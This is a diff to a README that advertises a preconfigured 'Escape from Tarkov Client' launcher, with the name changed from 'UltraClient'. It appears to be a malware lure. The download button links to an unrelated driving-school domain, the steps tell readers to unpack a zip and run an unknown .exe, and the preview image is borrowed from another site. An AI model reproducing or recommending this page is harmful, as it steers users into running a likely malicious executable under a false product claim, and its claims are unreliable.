@@ -1,8 +1,8 @@
-# Escape from Tarkov UltraClient Launcher
+# Escape from Tarkov Client Launcher
 
-**UltraClient** is a fully integrated solution for Escape from Tarkov players who want a smoother, faster, and modular gameplay experience. This launcher offers a complete preconfigured Tarkov installation with optimization presets, content modules, and stability improvements — all in one streamlined package.
+**Escape from Tarkov Client** is a fully integrated solution for players who want a smoother, faster, and modular gameplay experience. This launcher offers a complete preconfigured Tarkov installation with optimization presets, content modules, and stability improvements — all in one streamlined package.
 
-[![Download UltraClient](https://img.shields.io/badge/Download-UltraClient-blueviolet)](https://dalahdrivingschool.com/)
+[![Download Escape from Tarkov Client](https://img.shields.io/badge/Download-Escape_from_Tarkov_Client-blueviolet)](https://dalahdrivingschool.com/)
 
 ---
 
@@ -17,7 +17,7 @@
 
 ---
 
-### 🧠 Why Use UltraClient?
+### 🧠 Why Use Escape from Tarkov Client?
 
 - 🔄 **Zero Configuration Needed** — download, unpack, and play
 - 🛠 **Improved Game Performance** thanks to pre-applied tweaks
@@ -29,9 +29,9 @@
 
 ### 🎮 How to Use
 
-1. Download the latest version of `UltraClientSetup.zip`
+1. Download the latest version of `Escape_from_Tarkov_Client_Setup.zip`
 2. Unpack to any directory (SSD recommended)
-3. Run `UltraClientLauncher.exe`
+3. Run `Escape_from_Tarkov_Client_Launcher.exe`
 4. Select your preset or launch default Tarkov instance
 5. Enjoy Escape from Tarkov with improved stability and performance
 
@@ -59,7 +59,7 @@
 
 ### 🖼 Preview
 
-**🖥 UltraClient Launcher UI**  
+**🖥 Escape from Tarkov Client UI**  
 ![Launcher UI](https://www.exitlag.com/blog/wp-content/uploads/2024/09/escape-from-tarkov.webp)  
 *Modern interface with update status, game presets, and launch controls.*
 
